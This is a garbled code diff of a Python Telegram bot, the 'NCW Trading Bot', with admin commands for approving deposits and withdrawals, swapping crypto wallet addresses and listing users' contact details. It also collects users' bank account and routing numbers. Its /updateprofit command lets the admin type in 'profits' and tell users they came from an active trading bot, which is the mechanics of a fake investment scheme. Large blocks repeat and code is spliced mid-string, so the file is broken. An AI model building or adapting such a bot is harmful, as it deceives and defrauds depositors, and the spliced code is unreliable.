+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             MAIN_MENU: [
-                CallbackQueryHandler(show_main_menu, pattern='^proceed_to_menu$'),
-                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu$'),
-                CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'),
-                CallbackQueryHandler(visit_website, pattern='^visit_website$'),
-                CallbackQueryHandler(handle_deposit, pattern='^deposit$'),
-                CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'),
+                CallbackQueryHandler(show_main_menu, pattern='^proceed_to_menu:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
